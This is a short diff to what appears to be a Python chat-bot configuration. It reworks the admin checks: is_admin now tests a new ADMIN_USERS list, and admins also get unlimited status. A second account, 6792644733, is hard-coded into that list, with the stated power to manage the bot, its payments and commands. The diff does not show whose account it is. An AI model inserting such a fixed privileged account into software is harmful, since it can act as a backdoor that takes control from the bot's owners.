@@ -22,8 +22,14 @@ if extra_vips:
         if v.isdigit() and int(v) not in UNLIMITED_USERS:
             UNLIMITED_USERS.append(int(v))
 
+# Asosiy adminlar (Botni boshqarish, to'lovlar va buyruqlar huquqiga ega)
+ADMIN_USERS = [ADMIN_ID]
+if 6792644733 not in ADMIN_USERS:
+    ADMIN_USERS.append(6792644733)
+
 def is_admin(user_id: int) -> bool:
-    return user_id in UNLIMITED_USERS or user_id == ADMIN_ID
+    return user_id in ADMIN_USERS or user_id == ADMIN_ID
 
 def is_unlimited(user_id: int) -> bool:
-    return user_id in UNLIMITED_USERS or user_id == ADMIN_ID
+    return user_id in UNLIMITED_USERS or user_id in ADMIN_USERS or user_id == ADMIN_ID
+
